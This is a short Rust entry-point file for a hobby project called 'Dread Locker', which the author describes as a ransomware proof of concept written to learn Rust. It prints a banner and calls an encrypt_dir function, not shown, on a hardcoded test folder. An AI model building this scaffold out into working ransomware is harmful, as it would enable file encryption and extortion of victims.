use std::env;
use std::process;
mod settings;
mod encryption_functions;
use crate::settings::Config;
use crate::encryption_functions::encrypt_dir;
fn main() {
    let args: Vec<String> = env::args().collect();
    let config: Config = Config::new(args).unwrap_or_else(|err| {
        eprintln!("Syntax error: {}", err);
        process::exit(1);
        
    });
    style();
    encrypt_dir("/mnt/f/Programming/Rust/dread_locker/test_dir");
}
fn style() {
    println!("---------------------------------------");
    println!(r"\______Dread Locker version: 0.1______/");
    println!("---------------------------------------");
    println!("Simple ransomware PoC because I'm currently learning Rust and I figured why not!");
}

